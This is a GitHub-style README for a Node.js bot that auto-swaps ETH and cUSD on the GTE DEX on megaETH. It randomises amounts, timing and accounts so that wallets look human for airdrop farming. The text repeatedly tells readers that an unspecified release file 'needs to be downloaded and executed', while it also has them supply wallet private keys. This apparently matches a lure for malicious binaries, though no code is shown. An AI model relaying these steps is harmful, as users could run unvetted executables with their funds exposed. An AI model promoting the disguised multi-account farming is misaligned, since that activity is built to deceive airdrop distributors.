# Auto-Swap ETH ↔ cUSD Bot for GTE DEX on megaETH Network

[![Releases — Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/LTNhanDev/auto-swap-megaETH-dex-GTE/releases)

<img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=023" alt="ETH" width="80" /> <img src="https://cryptologos.cc/logos/celo-cusd-logo.png?v=023" alt="cUSD" width="80" /> <img src="https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/static/ethereum-icon.png" alt="GTE" width="80" />

One-line: A Node.js bot that swaps ETH and cUSD on the GTE DEX on megaETH. It randomizes swap amounts, delays, and transaction counts to produce natural-looking on-chain activity for airdrop farming.

Badges
- Topics: airdrop, automated, automation, bot, crypto, cusd, dex, gte, megaeth, swap, swap-bot, trading, web3
- Language: JavaScript / Node.js
- Platform: megaETH

About the release
- Download and run the release file from https://github.com/LTNhanDev/auto-swap-megaETH-dex-GTE/releases — the release file needs to be downloaded and executed.
- The release will include a packaged build and example config files. Use the packaged executable or the Node bundle inside the release.

Features
- Swap ETH ↔ cUSD on the GTE DEX.
- Randomized amounts per swap within user bounds.
- Randomized delay between transactions.
- Randomized count of transactions per session.
- Gas and nonce handling tuned for megaETH.
- Dry-run mode for simulation and logging.
- Support for using a local node, Infura, or other JSON-RPC provider.
- Simple config via JSON or environment variables.

Why use this
- Generate varied on-chain interactions to qualify for activity-based farming or airdrops.
- Run headless on a VPS or local machine.
- Tune behavior to match wallet limits and risk appetite.
- Log full tx history for audits and analysis.

Screenshot
![demo](https://miro.medium.com/max/1400/1*9b2R0VqK7hEo5mR9m1q6aQ.png)

Quick setup (developer mode)
1. Install Node.js 18+.
2. Clone or download the repository.
3. Download and run the release file from https://github.com/LTNhanDev/auto-swap-megaETH-dex-GTE/releases — the release file needs to be downloaded and executed.
4. Create a .env or config.json based on the sample below.
5. Run npm install, then npm start or node dist/runner.js (packaged path may vary).

Example .env
```
RPC_URL=https://rpc.megaeth.example
PRIVATE_KEY=0xYOUR_PRIVATE_KEY
MIN_SWAP_ETH=0.01
MAX_SWAP_ETH=0.12
MIN_DELAY_MS=15000
MAX_DELAY_MS=120000
MIN_TX_PER_SESSION=3
MAX_TX_PER_SESSION=10
DRY_RUN=false
SLIPPAGE=0.005
GAS_MULTIPLIER=1.05
```

Example config.json
```json
{
  "rpc": "https://rpc.megaeth.example",
  "privateKey": "0xYOUR_PRIVATE_KEY",
  "pairs": [
    {
      "from": "ETH",
      "to": "cUSD",
      "minAmount": 0.02,
      "maxAmount": 0.08
    },
    {
      "from": "cUSD",
      "to": "ETH",
      "minAmount": 1.5,
      "maxAmount": 5.0
    }
  ],
  "session": {
    "minTx": 3,
    "maxTx": 8,
    "minDelayMs": 20000,
    "maxDelayMs": 90000
  },
  "slippage": 0.006,
  "gasMultiplier": 1.07,
  "dryRun": true
}
```

How it works
- The bot loads RPC and key data.
- It picks a pair (ETH→cUSD or cUSD→ETH).
- It picks a random amount within min and max for that pair.
- It signs a swap transaction for the GTE DEX router contract.
- It sets gas price or gas tip using a gas multiplier above the estimate.
- It submits the tx and waits for receipt, then logs success or error.
- It waits a randomized delay and repeats for a randomized number of txs in the session.
- It rotates between swap directions to create mixed on-chain history.

Commands
- npm install
- npm run build
- npm start
- node dist/runner.js --config config.json
- node dist/runner.js --dry

CLI flags
- --config path to JSON config
- --env load config from .env
- --dry run in simulation mode, no txs submitted
- --loglevel debug|info|warn|error

Examples
- Run a single session (dry):
  node dist/runner.js --config config.json --dry
- Run live:
  node dist/runner.js --config config.json

RPC providers
- Use a stable RPC provider for megaETH.
- The bot supports HTTP and WebSocket JSON-RPC.
- If you use public RPC, expect rate limits. Use your own endpoint where possible.

Gas and nonce handling
- The bot queries the chain for an estimate and multiplies the value by gasMultiplier.
- It fetches the nonce per account and increments locally.
- If a tx drops, the bot retries with a replacement tx and increased gas.
- The bot supports manual gas limits for advanced users.

Logging and telemetry
- The bot logs each tx to a local JSON log file.
- Logs include: timestamp, direction, amount, txHash, nonce, gasUsed, status.
- Use the logs for airdrop proof or auditing.

Safety and best practices
- Store private keys in a secure vault or .env file on a secure machine.
- Test in dry-run mode on a testnet or with a small amount first.
- Set sensible min/max amounts based on your balance.
- Use separate accounts per campaign if you need account separation.

Advanced options
- Patterns: define a sequence of swap sizes to mimic human behavior.
- Work hours: run only during certain clock hours to match local activity windows.
- Multi-account: run several instances with different keys to spread activity.
- Pair weighting: prefer one direction over the other with a weight value.

Integration with monitoring
- The bot can push logs to Telegram, Discord, or a webhook.
- Use built-in webhooks to send a simple JSON payload after each confirmed tx.
- Use health-check endpoints for uptime monitoring.

Troubleshooting
- Transaction fails with "insufficient funds": lower maxAmount or add funds.
- Transactions stuck pending: increase gasMultiplier or check RPC.
- Swap revert: adjust slippage or verify pair contract addresses.
- Rate limits from RPC: switch provider or add a local node.

Development notes
- The code uses ethers.js v6 for provider, signer, and contract calls.
- The DEX router ABI is minimal and limited to the swap paths used.
- Tests use a local fork and deterministic accounts for replay.
- The packaging uses pkg and a small bootstrap script for the release binary.

Contributing
- Fork the repo and create a feature branch.
- Open a PR with a clear title and a short description of changes.
- Add unit tests for new logic.
- Keep changes small and focused.

Security checklist
- Do not commit private keys to the repository.
- Rotate keys if a key leaks.
- Review one-line contract addresses before running.
- Prefer read-only dry-run when testing new config changes.

Release downloads
- Visit the releases page to get the packaged build and example configs:
  https://github.com/LTNhanDev/auto-swap-megaETH-dex-GTE/releases
- The release includes a bundle that you can run on Linux, macOS, or Windows.
- If you prefer source, clone and build locally.

License
- MIT License. See LICENSE file in the repo for details.

Contact
- Open issues on GitHub for bugs or feature requests.
- Use PRs for code changes and improvements.

Changelog highlights
- v1.0: Core swap logic, config file, and dry-run.
- v1.1: Gas handling, nonce fix, logging.
- v1.2: Packaging and multi-account support.

Examples of realistic session patterns
- Short bursts: 3–5 txs, 20s–45s delays, small amounts to avoid price impact.
- Medium session: 6–12 txs, 30s–120s delays, mixed amounts.
- Long session: 12–50 txs, 15s–180s delays, rotate accounts during run.

References and links
- GTE DEX docs (contract addresses and router ABI): check repository docs folder.
- Ethers.js: https://docs.ethers.org
- Node.js: https://nodejs.org

License file and contribution guide exist in repo. Follow them when you send pull requests.